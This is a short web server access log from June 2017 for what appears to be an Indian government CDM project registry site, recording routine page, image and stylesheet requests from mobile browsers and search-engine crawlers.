64.233.173.138 - - [10/Jun/2017:07:53:40 +0530] "GET /Scripts/AC_RunActiveContent.js HTTP/1.1" 200 8321 "http://www.cdmindia.gov.in/project_details_view.php?id=266" "Mozilla/5.0 (Linux; Android 4.4.4; HM NOTE 1LTE Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.137 - - [10/Jun/2017:07:53:40 +0530] "GET /images/img2.jpg HTTP/1.1" 200 16276 "http://www.cdmindia.gov.in/project_details_view.php?id=266" "Mozilla/5.0 (Linux; Android 4.4.4; HM NOTE 1LTE Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.138 - - [10/Jun/2017:07:53:41 +0530] "GET /images/img1.jpg HTTP/1.1" 200 1251 "http://www.cdmindia.gov.in/project_details_view.php?id=266" "Mozilla/5.0 (Linux; Android 4.4.4; HM NOTE 1LTE Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.138 - - [10/Jun/2017:07:53:41 +0530] "GET /images/fbg.jpg HTTP/1.1" 200 325 "http://www.cdmindia.gov.in/project_details_view.php?id=266" "Mozilla/5.0 (Linux; Android 4.4.4; HM NOTE 1LTE Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.136 - - [10/Jun/2017:07:53:41 +0530] "GET /favicon.ico HTTP/1.1" 200 1189 "http://www.cdmindia.gov.in/project_details_view.php?id=266" "Mozilla/5.0 (Linux; Android 4.4.4; HM NOTE 1LTE Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
40.77.167.85 - - [10/Jun/2017:07:53:59 +0530] "GET /future_projects.php HTTP/1.1" 302 26212 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.85 - - [10/Jun/2017:07:53:59 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.85 - - [10/Jun/2017:07:54:00 +0530] "GET /index.php HTTP/1.1" 200 19482 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.156 - - [10/Jun/2017:07:56:48 +0530] "GET /project_details_view.php?id=1069 HTTP/1.1" 200 14656 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
35.184.109.186 - - [10/Jun/2017:07:59:53 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
168.235.205.179 - - [10/Jun/2017:08:00:32 +0530] "GET /project_details_view_report.php?id=1272 HTTP/1.1" 200 13244 "https://www.google.co.in/search?q=synergy+shakti+renewable+energy+ltd+krishnagiri&biw=360&bih=567&prmd=nmiv&source=lnms&sa=X&ved=0ahUKEwie8LbpnbLUAhWKr48KHX-0BbwQ_AUIBigA" "Mozilla/5.0 (Linux; U; Android 5.1.1; en-US; Lenovo A6020a40 Build/LMY47V) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.2.8.945 U3/0.8.0 Mobile Safari/534.30"
168.235.205.179 - - [10/Jun/2017:08:00:33 +0530] "GET /images/img2.jpg HTTP/1.1" 200 16276 "http://www.cdmindia.gov.in/project_details_view_report.php?id=1272" "Mozilla/5.0 (Linux; U; Android 5.1.1; en-US; Lenovo A6020a40 Build/LMY47V) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.2.8.945 U3/0.8.0 Mobile Safari/534.30"
168.235.205.179 - - [10/Jun/2017:08:00:33 +0530] "GET /includes/ncdma.css HTTP/1.1" 200 13023 "http://www.cdmindia.gov.in/project_details_view_report.php?id=1272" "Mozilla/5.0 (Linux; U; Android 5.1.1; en-US; Lenovo A6020a40 Build/LMY47V) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.2.8.945 U3/0.8.0 Mobile Safari/534.30"
168.235.205.179 - - [10/Jun/2017:08:00:33 +0530] "GET /ncdma.css HTTP/1.1" 200 12640 "http://www.cdmindia.gov.in/project_details_view_report.php?id=1272" "Mozilla/5.0 (Linux; U; Android 5.1.1; en-US; Lenovo A6020a40 Build/LMY47V) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.2.8.945 U3/0.8.0 Mobile Safari/534.30"
